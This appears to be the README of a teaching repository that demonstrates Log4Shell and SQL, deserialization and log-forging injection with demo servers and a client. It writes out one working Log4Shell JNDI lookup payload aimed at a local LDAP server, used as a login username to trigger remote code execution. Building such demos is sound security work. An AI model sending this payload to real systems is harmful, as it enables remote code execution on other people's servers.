# Top Security Flaws

This repository focuses on identifying and mitigating top security flaws in software projects. It currently includes subprojects on Log4Shell and SQL Injection, Deserialization Injection, Log forging injection.

## Subprojects

### Log4Shell
Log4Shell is a critical vulnerability in the Apache Log4j library. This subproject aims to:
- Create a demo project to test the vulnerability
- It has a LDAP simple server (based on ....) and a HTTP endpoint
- Using its login page, we can pass {jndi:ldap://127.0.0.1:9999/Evil} as the user, and then Log4J will do a remote execution of the Calendar

### Injections
A Quarkus project containing the code to :
- Test SQL Injection, Deserialization Injection and Log forging injection
- It contains a JavaFX screen as the client, and few servers in order to test these injection vulnerabilities

## Getting Started
To get started with the subprojects, navigate to their respective directories and follow the instructions provided in their README files.


## Contact
For any questions or suggestions, please open an issue or contact the maintainers.
